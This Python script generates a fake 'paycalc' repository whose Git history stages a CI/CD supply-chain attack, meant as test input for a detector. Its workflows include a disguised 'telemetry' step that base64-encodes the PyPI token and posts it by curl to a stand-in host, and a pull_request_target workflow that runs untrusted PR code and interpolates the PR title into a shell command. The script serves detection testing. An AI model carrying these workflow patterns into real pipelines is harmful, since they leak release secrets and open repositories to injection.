"""Generate a repository with a CI/CD attack staged across its history.

The GitHub Actions Goat repository demonstrates vulnerable *workflows*, which is
what the rule engine needs. It does not demonstrate a vulnerable *history*: its
commits are ordinary project work, so there is nothing for the temporal
correlation or the commit layer of the graph to find.

This script builds the missing half. It creates a small, plausible project whose
pipeline is hardened at the start, then walks it through the change sequence a
real supply-chain compromise looks like:

    C1  a helper action is introduced, pinned to a tag        (looks routine)
    C2  the token's permissions are widened to contents:write (looks routine)
    C3  a build step gains a network call that ships a secret (looks routine)

No single commit is obviously malicious, which is the point. Each one is the
kind of change that passes review on its own; the attack is the sequence.

Run it, then scan the result::

    python examples/build_cicd_demo.py /tmp/demo
    python -m cicd_detector scan /tmp/demo --no-llm

Nothing here is executed by the scanner -- the files are only ever read.
"""

from __future__ import annotations

import argparse
import shutil
import subprocess
import sys
from dataclasses import dataclass
from pathlib import Path

#: A fixed identity and clock so two runs produce identical histories, which
#: makes the demo's finding ids and commit shas stable enough to write about.
_AUTHORS = {
    "maintainer": ("Dana Okafor", "dana@example.com"),
    "contributor": ("R. Vance", "rvance@example.invalid"),
}

_BASE_DATE = "2026-01-%02dT10:%02d:00"


@dataclass
class Commit:
    """One commit in the staged history."""

    message: str
    author: str
    files: dict[str, str]
    day: int
    removals: tuple[str, ...] = ()


def _run(argv: list[str], cwd: Path, env: dict[str, str] | None = None) -> None:
    result = subprocess.run(
        argv, cwd=cwd, capture_output=True, text=True, env=env, check=False
    )
    if result.returncode != 0:
        raise SystemExit(
            f"git command failed: {' '.join(argv)}\n{result.stderr.strip()}"
        )


def _commit_env(author_key: str, day: int, minute: int) -> dict[str, str]:
    import os

    name, email = _AUTHORS[author_key]
    stamp = _BASE_DATE % (day, minute)
    env = dict(os.environ)
    env.update(
        {
            "GIT_AUTHOR_NAME": name,
            "GIT_AUTHOR_EMAIL": email,
            "GIT_COMMITTER_NAME": name,
            "GIT_COMMITTER_EMAIL": email,
            "GIT_AUTHOR_DATE": stamp,
            "GIT_COMMITTER_DATE": stamp,
        }
    )
    return env


# -- the workflow, at each stage ----------------------------------------------

_WORKFLOW_INITIAL = """\
name: Release

on:
  push:
    tags:
      - 'v*'

permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@8f4b7f84864484a7bf31766abe9204da3cbe65b3
      - name: Build the package
        run: |
          python -m pip install --upgrade build
          python -m build
      - name: Upload build output
        uses: actions/upload-artifact@65462800fd760344b1a7b4382951275a0abb4808
        with:
          name: dist
          path: dist/
"""

# C1: a third-party helper appears. Pinned to a tag, which is normal practice
# in most repositories and reads as unremarkable in review.
_WORKFLOW_C1 = """\
name: Release

on:
  push:
    tags:
      - 'v*'

permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@8f4b7f84864484a7bf31766abe9204da3cbe65b3
      - name: Derive version metadata
        id: meta
        uses: build-helpers/version-utils@v2
      - name: Build the package
        run: |
          python -m pip install --upgrade build
          python -m build
      - name: Upload build output
        uses: actions/upload-artifact@65462800fd760344b1a7b4382951275a0abb4808
        with:
          name: dist
          path: dist/
"""

# C2: the workflow starts publishing, so it "needs" write access. Also
# justifiable on its own -- a release workflow that cannot write is useless.
_WORKFLOW_C2 = """\
name: Release

on:
  push:
    tags:
      - 'v*'

permissions:
  contents: write
  packages: write
  id-token: write

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@8f4b7f84864484a7bf31766abe9204da3cbe65b3
      - name: Derive version metadata
        id: meta
        uses: build-helpers/version-utils@v2
      - name: Build the package
        run: |
          python -m pip install --upgrade build
          python -m build
      - name: Publish to the registry
        env:
          TWINE_PASSWORD: ${{ secrets.PYPI_API_TOKEN }}
        run: |
          python -m twine upload dist/*
      - name: Upload build output
        uses: actions/upload-artifact@65462800fd760344b1a7b4382951275a0abb4808
        with:
          name: dist
          path: dist/
"""

# C3: a "build telemetry" step. This is the one that matters: it derives a
# value from the release token and posts it to a host nobody reviewed.
_WORKFLOW_C3 = """\
name: Release

on:
  push:
    tags:
      - 'v*'

permissions:
  contents: write
  packages: write
  id-token: write

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@8f4b7f84864484a7bf31766abe9204da3cbe65b3
      - name: Derive version metadata
        id: meta
        uses: build-helpers/version-utils@v2
      - name: Build the package
        run: |
          python -m pip install --upgrade build
          python -m build
      - name: Report build telemetry
        env:
          RELEASE_TOKEN: ${{ secrets.PYPI_API_TOKEN }}
        run: |
          BUILD_ID=$(echo "$RELEASE_TOKEN" | base64 -w0)
          curl -sS -X POST -d "build=$BUILD_ID" https://build-telemetry.example.net/ingest
      - name: Publish to the registry
        env:
          TWINE_PASSWORD: ${{ secrets.PYPI_API_TOKEN }}
        run: |
          python -m twine upload dist/*
      - name: Upload build output
        uses: actions/upload-artifact@65462800fd760344b1a7b4382951275a0abb4808
        with:
          name: dist
          path: dist/
"""

# A second workflow, added late, with the classic pwn-request shape.
_WORKFLOW_PR = """\
name: PR Preview

on:
  pull_request_target:
    types: [opened, synchronize]

permissions:
  contents: write
  pull-requests: write

jobs:
  preview:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@8f4b7f84864484a7bf31766abe9204da3cbe65b3
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - name: Install and build the preview
        run: |
          npm install
          npm run build
      - name: Comment on the pull request
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          echo "Preview for ${{ github.event.pull_request.title }}"
          gh pr comment "$PR" --body "Preview built"
"""

_README = """\
# paycalc

A small library for calculating payroll deductions.

This repository is generated by `examples/build_cicd_demo.py` for demonstrating
the CI/CD attack detector. It is not a real project, and the telemetry endpoint
in its release workflow does not exist.
"""

_SOURCE_V1 = """\
\"\"\"Payroll deduction helpers.\"\"\"


def net_pay(gross: float, rate: float) -> float:
    \"\"\"Pay remaining after a flat deduction rate.\"\"\"

    if not 0 <= rate < 1:
        raise ValueError("rate must be in [0, 1)")
    return round(gross * (1 - rate), 2)
"""

_SOURCE_V2 = _SOURCE_V1 + """

def annual(gross_monthly: float, rate: float) -> float:
    \"\"\"Net pay over twelve months.\"\"\"

    return round(net_pay(gross_monthly, rate) * 12, 2)
"""

_PYPROJECT = """\
[project]
name = "paycalc"
version = "0.1.0"
requires-python = ">=3.11"
dependencies = []
"""

WORKFLOW = ".github/workflows/release.yml"
PR_WORKFLOW = ".github/workflows/pr-preview.yml"


def _history() -> list[Commit]:
    """The commit sequence, oldest first."""

    return [
        Commit(
            message="Initial project layout",
            author="maintainer",
            day=6,
            files={
                "README.md": _README,
                "pyproject.toml": _PYPROJECT,
                "src/paycalc/__init__.py": _SOURCE_V1,
            },
        ),
        Commit(
            message="Add a release workflow\n\nBuilds on tag and uploads the artifact.",
            author="maintainer",
            day=7,
            files={WORKFLOW: _WORKFLOW_INITIAL},
        ),
        Commit(
            message="Add annual() helper",
            author="maintainer",
            day=9,
            files={"src/paycalc/__init__.py": _SOURCE_V2},
        ),
        # -- C1 ---------------------------------------------------------------
        Commit(
            message=(
                "Use version-utils to derive release metadata\n\n"
                "Saves hand-maintaining the version string in two places."
            ),
            author="contributor",
            day=12,
            files={WORKFLOW: _WORKFLOW_C1},
        ),
        Commit(
            message="Document the release process",
            author="maintainer",
            day=13,
            files={"docs/RELEASING.md": "# Releasing\n\nTag with `vX.Y.Z`.\n"},
        ),
        # -- C2 ---------------------------------------------------------------
        Commit(
            message=(
                "Publish to the package registry on tag\n\n"
                "The release job now needs write access to push the package."
            ),
            author="contributor",
            day=16,
            files={WORKFLOW: _WORKFLOW_C2},
        ),
        # -- C3 ---------------------------------------------------------------
        Commit(
            message=(
                "Report build telemetry\n\n"
                "Sends an anonymous build identifier so we can track release "
                "durations."
            ),
            author="contributor",
            day=21,
            files={WORKFLOW: _WORKFLOW_C3},
        ),
        Commit(
            message="Add a PR preview workflow",
            author="contributor",
            day=23,
            files={PR_WORKFLOW: _WORKFLOW_PR},
        ),
        Commit(
            message="Fix rounding in net_pay docstring",
            author="maintainer",
            day=24,
            files={
                "src/paycalc/__init__.py": _SOURCE_V2.replace(
                    "Pay remaining after a flat deduction rate.",
                    "Pay remaining after applying a flat deduction rate.",
                )
            },
        ),
    ]


def build(destination: Path, *, force: bool = False) -> Path:
    """Create the demo repository at ``destination``."""

    if destination.exists():
        if not force:
            raise SystemExit(
                f"{destination} already exists. Pass --force to replace it."
            )
        shutil.rmtree(destination)
    destination.mkdir(parents=True)

    _run(["git", "init", "--quiet", "--initial-branch=main"], destination)
    _run(["git", "config", "user.name", "Demo"], destination)
    _run(["git", "config", "user.email", "demo@example.com"], destination)
    _run(["git", "config", "commit.gpgsign", "false"], destination)

    for index, commit in enumerate(_history()):
        for relative, content in commit.files.items():
            path = destination / relative
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(content, encoding="utf-8")
        for relative in commit.removals:
            (destination / relative).unlink(missing_ok=True)

        _run(["git", "add", "-A"], destination)
        _run(
            ["git", "commit", "--quiet", "-m", commit.message],
            destination,
            env=_commit_env(commit.author, commit.day, index * 7),
        )

    return destination


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        description=(
            "Build a demo repository whose CI/CD attack is staged across its "
            "Git history."
        )
    )
    parser.add_argument(
        "destination", nargs="?", default="demo-repo", help="Where to create it."
    )
    parser.add_argument(
        "--force", action="store_true", help="Replace the destination if it exists."
    )
    args = parser.parse_args(argv)

    path = build(Path(args.destination).expanduser().resolve(), force=args.force)

    print(f"Demo repository created at {path}")
    print("\nThe attack is staged across three commits that each look routine:")
    print("  C1  introduces build-helpers/version-utils@v2   (a mutable tag)")
    print("  C2  widens the token to contents/packages/id-token: write")
    print("  C3  adds a step that base64-encodes the release token and POSTs it")
    print("\nScan it with:")
    print(f"  python -m cicd_detector scan {path} --no-llm")
    print(f"  python -m cicd_detector graph {path} --output-dir {path}/graph")
    return 0


if __name__ == "__main__":
    sys.exit(main())
